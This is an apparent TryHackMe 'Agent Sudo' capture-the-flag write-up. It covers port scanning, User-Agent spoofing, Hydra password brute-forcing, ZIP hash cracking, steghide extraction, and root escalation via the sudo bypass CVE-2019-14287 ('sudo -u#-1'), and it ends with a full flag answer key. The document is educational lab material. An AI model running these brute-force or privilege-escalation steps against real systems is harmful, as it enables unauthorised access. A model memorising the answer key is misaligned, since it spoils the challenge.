## Agent Sudo - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/agentsudoctf)

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

**IP: 10.10.133.46**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Steganography, Brute Forcing <br>

**Tools Used**: Nmap, Gobuster, Binwalk, Steghide, Hydra, John The Ripper

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.

  ```
  nmap -A -p- -vv 10.10.133.46

  PORT   STATE SERVICE REASON         VERSION
  21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
  22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
  |   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
  |   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
  80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Annoucement
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  TCP/IP fingerprint:
  OS:SCAN(V=7.95%E=4%D=5/4%OT=21%CT=1%CU=38940%PV=Y%DS=2%DC=T%G=Y%TM=6817B38C
  OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=A)SEQ(
  OS:SP=103%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%I
  OS:I=I%TS=A)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=F6%GCD=1%IS
  OS:R=102%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11
  OS:NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68D
  OS:F%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)
  OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
  OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
  OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
  OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
  OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
  ```

  ```
  gobuster dir -u http://10.10.133.46/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /index.php            (Status: 200) [Size: 218]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Since I saw codename on web app and question about getting to secret page I started using `curl` for some checkups. First I did `-A "A"` then `-A "B"` and so on. On third attempt I got a different message.

  ```
  curl -A "C" -L http://10.10.133.46/ 

  Attention chris, <br><br>
  
  Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
  
  From,<br>
  Agent R 
  ```
  
- So first steps are done, I also tried `curl -A "J" -L http://10.10.133.46/` since it was mentioned in previouse response but I got nothing new.

---

## 🌐 Brute Forcing and Steganography

- Since I already have valid username `chris` getting his FTP password was easy.

  ```
  hydra -l chris -P /rockyou.txt ftp://10.10.133.46

  [21][ftp] host: 10.10.133.46   login: chris   password: crystal
  ```
  
- Let's login with FTP. I found a message and 2 pictures inside and downloaded them to my Kali. Downloaded few of cuties!!!!

  ```
  ftp 10.10.133.46 

  ls
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
  -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
  -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
  226 Directory send OK.
  ```
  
- This is the message to agent J.

  ```
  cat To_agentJ.txt

  Dear agent J,
  
  All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
  
  From,
  Agent C
  ```

- Now, I extracted hidden ZIP with `binwalk`

  ```
  binwalk cute-alien.jpg 

  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  0             0x0             JPEG image data, JFIF standard 1.01
  
  
  
  binwalk cutie.png                   
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
  869           0x365           Zlib compressed data, best compression
  34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
  34820         0x8804          End of Zip archive, footer length: 22
  
                                                                                                                       
  binwalk -e cutie.png 
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  869           0x365           Zlib compressed data, best compression
  34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
  
  WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
  
  ls
  cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
  ```

- OK, awesome! Since everything is encrypted in `_cutie.png.extracted` I couldn't do much with it. What I could do is convert that ZIP into hash with JTR, crack it and get the password/passphrase.

  ```
  cd _cutie.png.extracted

  zip2john 8702.zip > zip.hash
  john --wordlist=/rockyou.txt zip.hash
  alien            (8702.zip/To_agentR.txt)
  ```

- Perfect, now I extracted the ZIP with found password, replaced the message and found `steg password` as well. I used `7z` since `unzip` gave me error and didn't work at all.

  ```
  7z e 8702.zip 

  7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
   64-bit locale=en_GB.UTF-8 Threads:2 OPEN_MAX:1024, ASM
  
  Scanning the drive for archives:
  1 file, 280 bytes (1 KiB)
  
  Extracting archive: 8702.zip
  --
  Path = 8702.zip
  Type = zip
  Physical Size = 280
  
      
  Would you like to replace the existing file:
    Path:     ./To_agentR.txt
    Size:     98 bytes (1 KiB)
    Modified: 2025-05-04 19:43:28
  with the file from archive:
    Path:     To_agentR.txt
    Size:     86 bytes (1 KiB)
    Modified: 2019-10-29 13:29:11
  ? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y
  
                      
  Enter password (will not be echoed): 
  Everything is Ok
  
  Size:       86
  Compressed: 280
  
  cat To_agentR.txt 
  Agent C,
  
  We need to send the picture to 'QXJlYTUx' as soon as possible!
  
  By,
  Agent R
  
  echo "QXJlYTUx" | base64 -d                             
  Area51 
  ```

- Almost done. First I thought I could SSH with new password that I found, but that wasn't it. It was mentioned that hidden message is in some of the files so let's find it. `Area51` is passphrase.

  ```
  steghide --extract -sf cute-alien.jpg 
  Enter passphrase: 
  wrote extracted data to "message.txt".
  
  cat message.txt
  Hi james,
  
  Glad you find this message. Your login password is hackerrules!
  
  Don't ask me why the password look cheesy, ask agent R who set this password for you.
  
  Your buddy,
  chris
  ```

---

## ⚙️ Gaining Access

- You know the drill!

  ```
  ssh james@10.10.133.46 hackerrules!

  whoami
  james
  
  james@agent-sudo:~$ pwd
  /home/james
  
  james@agent-sudo:~$ ls -al
  total 80
  drwxr-xr-x 4 james james  4096 Oct 29  2019 .
  drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
  -rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
  -rw------- 1 root  root    566 Oct 29  2019 .bash_history
  -rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
  -rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
  drwx------ 2 james james  4096 Oct 29  2019 .cache
  drwx------ 3 james james  4096 Oct 29  2019 .gnupg
  -rw-r--r-- 1 james james   807 Apr  4  2018 .profile
  -rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
  -rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
  
  james@agent-sudo:~$ cat user_flag.txt 
  b03d975e8c92a7c04146cfa7a5a313c7
  ```
  
- To answer the next question, just download `Alien_autospy.jpg` and put it in Google Reverse Image Search, it will show `Roswell alien autopsy`

---

## 👑 Root Privilege Escalation

- Time to get real! This was pretty easy for me since earlier today I did [Linux Agency room](https://tryhackme.com/room/linuxagency) and I did the exact same exploitation there. You can find all the details about the exploit [here](https://www.exploit-db.com/exploits/47502).

  ```
  james@agent-sudo:/$ sudo -l
  [sudo] password for james: 
  Matching Defaults entries for james on agent-sudo:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User james may run the following commands on agent-sudo:
      (ALL, !root) /bin/bash
  
  james@agent-sudo:/$ sudo -u#-1 /bin/bash
  
  root@agent-sudo:/# whoami
  root
  
  root@agent-sudo:/# cd root
  root@agent-sudo:/root# ls
  root.txt
  root@agent-sudo:/root# cat root.txt 
  To Mr.hacker,
  
  Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
  
  Your flag is 
  b53a02f55b57d4439e3341834d70c062
  
  By,
  DesKel a.k.a Agent R
  ```

---

## 🏁 Flags

- **How many open ports?**: `3`
- **How you redirect yourself to a secret page?**: `user-agent`
- **What is the agent name?**: `chris`
- **FTP password**: `crystal`
- **Zip file password**: `alien`
- **steg password**: `Area51`
- **Who is the other agent (in full name)?**: `james`
- **SSH password**: `hackerrules!`
- **What is the user flag?**: `b03d975e8c92a7c04146cfa7a5a313c7`
- **What is the incident of the photo called?**: `Roswell alien autopsy`
- **CVE number for the escalation (Format: CVE-xxxx-xxxx)**: `CVE-2019-14287`
- **What is the root flag?**: `b53a02f55b57d4439e3341834d70c062`
- **(Bonus) Who is Agent R?**: `DesKel`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding right tools, I literally downloaded steghide for this CTF.`

- What did I learn?
  `Learned some new tools and a bit more of steganography and curl.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
